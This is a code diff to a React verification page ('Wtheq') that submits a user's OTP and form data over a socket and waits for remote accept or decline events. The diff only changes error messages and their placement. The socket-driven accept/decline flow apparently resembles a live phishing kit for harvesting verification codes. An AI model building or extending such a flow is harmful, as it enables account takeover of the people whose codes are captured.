@@ -47,7 +47,9 @@ const Wtheq = () => {
         .then(() => {
           socket.emit("motsl", { ...final, token });
         });
-    } catch (error) {}
+    } catch (error) {
+            setError("حدث خطأ برجاء المحاولة مره أخري");
+    }
   };
 
   const handleMotslOtp = async (e) => {
@@ -71,7 +73,9 @@ const Wtheq = () => {
             id: sessionStorage.getItem("id"),
           });
         });
-    } catch (error) {}
+    } catch (error) {
+             setError("حدث خطأ برجاء المحاولة مره أخري");
+    }
   };
 
   socket.on("acceptMotsl", (id) => {
@@ -84,7 +88,8 @@ const Wtheq = () => {
     if (id === sessionStorage.getItem("id")) {
       setPage(0);
       setLoading(false);
-      setFaild("خطأ في البيانات");
+             setFaild("حدث خطأ برجاء المحاولة مره أخري");
+     
     }
   });
 
@@ -104,7 +109,7 @@ const Wtheq = () => {
   });
   socket.on("declineMotslOtp", (info) => {
     if (info.token === token) {
-      setFaild("خطأ في البيانات");
+           setFaild("حدث خطأ برجاء المحاولة مره أخري");
       setPage(1);
     }
   });
@@ -125,11 +130,6 @@ const Wtheq = () => {
         </div>
       )}
       <div className=" w-full bg-white flex flex-col items-start p-2 my-5">
-        {failed && (
-          <span className="p-2 w-full text-red-500 text-center text-xl">
-            {failed}
-          </span>
-        )}
         {page === 0 ? (
           <>
             <img src="/wtheq1.png" />
@@ -193,7 +193,11 @@ const Wtheq = () => {
                   )}
                 </div>
               </div>
-
+              {failed && (
+                <span className="p-2 w-full text-red-500 text-center text-xl">
+                  {failed}
+                </span>
+              )}
               <div className="w-full text-left">
                 <button className=" mt-5 rounded-md text-lg border bg-green-800 w-full  text-white px-2 py-1">
                   توثيق
@@ -229,6 +233,11 @@ const Wtheq = () => {
                   value={storedData.MotslOtp}
                   onChange={handleChange}
                 />
+                {failed && (
+                  <span className="p-2 w-full text-red-500 text-center text-xl">
+                    {failed}
+                  </span>
+                )}
                 <button className="w-full border bg-green-600 text-white mt-5 rounded-md py-2 px-3 ">
                   تأكيد
                 </button>
@@ -265,6 +274,11 @@ const Wtheq = () => {
                 value={storedData.MotslOtp}
                 onChange={handleChange}
               />
+              {failed && (
+                <span className="p-2 w-full text-red-500 text-center text-xl">
+                  {failed}
+                </span>
+              )}
               <div className="w-full text-left">
                 <button className="w-fit border border-gray-700 text-gray-700 px-3 py-1">
                   التالي
